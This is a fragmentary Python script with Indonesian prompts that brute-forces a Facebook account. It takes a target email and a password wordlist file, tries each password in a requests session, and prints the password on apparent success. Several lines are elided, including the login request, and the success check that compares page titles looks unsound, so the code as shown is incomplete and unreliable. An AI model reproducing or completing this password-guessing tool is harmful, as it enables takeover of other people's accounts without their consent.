...
sleep(2)
print ('example : hacking@yahoo.com\033[96;1m')
email = input('masukkan email anda\033[33;1m : ')
sleep(1)
sandi = input('masukkan pasword.txt\033[33;1m : ')
passw = open(sandi, 'r')
print ('mencari password\033[32;1m')
def br():
   for password in passw:
       ...
       with requests.Session() as c:
           ...
           if(str(a) == '<title>Masuk Facebook | Facebook</title>'):
                ...
                sleep(1)
                print ('Login Succes\n\033[31;1m')
                print ('Password Adalah\033[31;1m ' + password)
                exit()
